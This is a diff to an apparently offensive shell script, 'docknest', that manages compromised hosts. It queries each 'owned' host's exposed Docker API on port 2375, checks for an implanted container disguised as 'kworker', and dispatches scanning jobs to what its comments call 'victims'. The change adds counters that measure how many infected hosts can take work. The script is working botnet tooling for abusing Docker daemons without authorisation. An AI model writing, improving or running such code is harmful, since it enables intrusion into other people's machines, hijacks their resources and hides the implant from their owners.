@@ -69,17 +69,23 @@ case "${cur:-}" in ''|*[!0-9]*) cur=0 ;; esac
 echo "docknest: callback $BASE  per=$PER par=$PAR max=$MAXH cursor=$cur/$TOT"
 
 n=0
+# Skip reasons are counted, not swallowed. "how many victims can even take a
+# shard" is THE number this whole vector scales with, and it was invisible: every
+# ineligible host left the loop through a silent `continue`, so a run that handed
+# work to 2 of 59 owned hosts looked identical to one where 40 were busy.
+sk_dead=0; sk_ours=0; sk_run=0; sk_busy=0
 for ip in $(cut -f1 "$WORK/dock.owned" 2>/dev/null | sort -u); do
     [ -n "$ip" ] || continue
     b="http://$ip:2375"
     lst=$(curl -sS -m 5 "$b/containers/json?all=1" 2>/dev/null) || lst=""
-    [ -n "$lst" ] || continue
+    if [ -z "$lst" ]; then sk_dead=$((sk_dead + 1)); continue; fi
     frag=$(printf '%s' "$lst" | sed 's/},{/}\n{/g' | grep -i 'kworker' | head -1)
-    [ -n "$frag" ] || continue
+    if [ -z "$frag" ]; then sk_ours=$((sk_ours + 1)); continue; fi
     st=$(printf '%s' "$frag" | grep -o '"State":"[a-z]*"' | head -1 | cut -d'"' -f4)
-    [ "$st" = running ] || continue
+    if [ "$st" != running ]; then sk_run=$((sk_run + 1)); continue; fi
     if printf '%s' "$lst" | sed 's/},{/}\n{/g' | grep -q '"kwscan"'; then
         echo "docknest: $ip already scanning"
+        sk_busy=$((sk_busy + 1))
         continue
     fi
 
@@ -114,4 +120,5 @@ for ip in $(cut -f1 "$WORK/dock.owned" 2>/dev/null | sort -u); do
 done
 
 printf '%s\n' "$cur" > "$CUR" 2>/dev/null || :
-echo "docknest: $n victim(s) scanning; cursor now $cur/$TOT"
+echo "docknest: $n scanning | skipped: dead=$sk_dead no_our_container=$sk_ours not_running=$sk_run busy=$sk_busy | cursor $cur/$TOT"
+echo "docknest: capacity = $n of $((n + sk_ours + sk_run)) hosts that answered (dead $sk_dead)"
